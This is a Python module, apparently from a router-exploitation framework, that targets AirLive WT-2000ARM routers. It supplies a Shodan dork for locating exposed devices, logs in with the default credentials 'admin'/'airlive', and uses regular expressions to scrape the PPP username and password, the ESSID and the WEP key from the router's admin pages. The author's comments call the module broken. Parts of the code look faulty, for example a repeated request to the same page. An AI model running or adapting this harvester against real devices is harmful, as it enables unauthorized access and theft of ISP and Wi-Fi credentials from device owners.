#Name:Airlive WT-2000ARM information harvester module
#File:WT2000ARM.py
#Author:Ján Trenčanský
#License: GNU GPL v3
#Created: 29.8.2013
#Last modified: 19.8.2015
#Shodan Dork: WWW-Authenticate: Basic realm="AirLive WT-2000ARM
#Description:This module is old, very very old, major refactoring is needed
#Actually it's complete shit I'll have to rewrite it completly
#TODO:Don't use it's broken

#UI
#WEP/WPA

import requests
import requests.exceptions
import re
import core.Harvester
from interface.messages import print_failed, print_success, print_red, print_green, print_warning, print_error


class Harvester(core.Harvester.RextHarvester):
    #Default credentials and default IP of target ( ,() is there because of for cycle that goes through credentials)
    def __init__(self):  # need to fix passing credentials () breaks for cycle)
        self.credentials_list = (("admin", "airlive"), ())
        core.Harvester.RextHarvester.__init__(self)

    #Start method needs to be named do_* for nested interpreter
    def do_run(self, e):
        for credentials in self.credentials_list:
            username = credentials[0]
            password = credentials[1]
            auth = (username, password)
            #Sending request
            try:
                print("Connecting to " + self.host)
                response = requests.get("http://"+self.host+"/basic/home_wan.htm", auth=auth, timeout=60)
                #headers, body = http.request("http://"+self.target+"/basic/home_wan.htm")
                #Checks if authentication was successful
                if response.status_code == 200:
                    print("200:Authentication successful :)")
                    ppp_credentials = self.fetch_ppp(response.text)
                    print(ppp_credentials)
                    #Sending request for home_wlan
                    response = requests.get("http://"+self.host+"/basic/home_wan.htm", auth=auth, timeout=60)
                    if response.status_code == 200:
                        wlan_credentials = self.fetch_wlan(response.text)
                        print(wlan_credentials)
                        return 1
                    else:
                        print_error("Failed fetching home_wlan.html. Status code:"+response.status_code)
                        return -1
                elif response.status_code == 401:
                    print("401:Authentication failed")
                    continue
                elif response.status_code == 404:
                    print("404:Page does not exists")
                    break
                else:
                    print("Something went wrong here. Status code:"+response.status_code)
                    break
            except requests.exceptions.Timeout:
                print_error("Timeout!")
            except requests.exceptions.ConnectionError:
                print_error("No route to host")
        return 1  # this shouldn't happen
            
    def fetch_ppp(self, body):
        html = body.decode('ascii')
        #Regex for username
        username_re = re.compile(r"""   #raw string
            NAME="wan_PPPUsername"      #search for wan_PPPUsername
            [^>]*?                      #Ignore any args between NAME and VALUE
            VALUE=                      #VALUE parameter
            (?P<quote>["'])             #Simple or double quotes
            (?P<username>[^\1]+?)       #Get ppp_username
            (?P=quote)                  #closed by quotes
            [^>]*?                      #any other args after NAME
            >                           #close of INPUT tag
            """, re.ASCII|re.IGNORECASE|re.VERBOSE)
        #Regex for password
        password_re = re.compile(r"""   #raw string
            NAME="wan_PPPPassword"      #search for wan_PPPPassword
            [^>]*?                      #Ignore any args between NAME and VALUE
            VALUE=                      #VALUE parameter
            (?P<quote>["'])             #Simple or double quotes
            (?P<password>[^\1]+?)       #Get ppp_password
            (?P=quote)                  #closed by quotes
            [^>]*?                      #any other args after NAME
            >                           #close of INPUT tag
            """, re.ASCII|re.IGNORECASE|re.VERBOSE)
        ppp_username = username_re.search(html)
        ppp_username = ppp_username.group("username")
        ppp_password = password_re.search(html)
        ppp_password = ppp_password.group("password")
        ppp_credentials = (ppp_username,ppp_password)
        return ppp_credentials

    def fetch_wlan(self,body):
        html = body.decode('ascii')
        essid_re = re.compile(r"""   #raw string
            name="ESSID"                #search for essid
            [^>]*?                      #Ignore any args between NAME and VALUE
            value=                      #VALUE parameter
            (?P<quote>["'])             #Simple or double quotes
            (?P<essid>[^\1]+?)          #Get essid
            (?P=quote)                  #closed by quotes
            [^>]*?                      #any other args after NAME
            >                           #close of INPUT tag
            """, re.ASCII|re.IGNORECASE|re.VERBOSE)
        #TODO return more than one key, skip keys 0x0000000000
        #TODO add support for determination of encryption type
        #WPA passphrase 
        wep_key_re = re.compile(r"""   #raw string
            name="WEP_Key[1-9]          #search for wan_PPPPassword
            [^>]*?                      #Ignore any args between NAME and VALUE
            value=                      #VALUE parameter
            (?P<quote>["'])             #Simple or double quotes
            (?P<key>[^\1]+?)            #Get key
            (?P=quote)                  #closed by quotes
            [^>]*?                      #any other args after NAME
            >                           #close of INPUT tag
            """, re.ASCII | re.IGNORECASE | re.VERBOSE)
        essid = essid_re.search(html)
        essid = essid.group("essid")
        wep_key = wep_key_re.search(html)
        wep_key = wep_key.group("key")
        wlan_credentials = (essid,wep_key)
        return wlan_credentials
                

#if __name__ == "__main__":
Harvester()
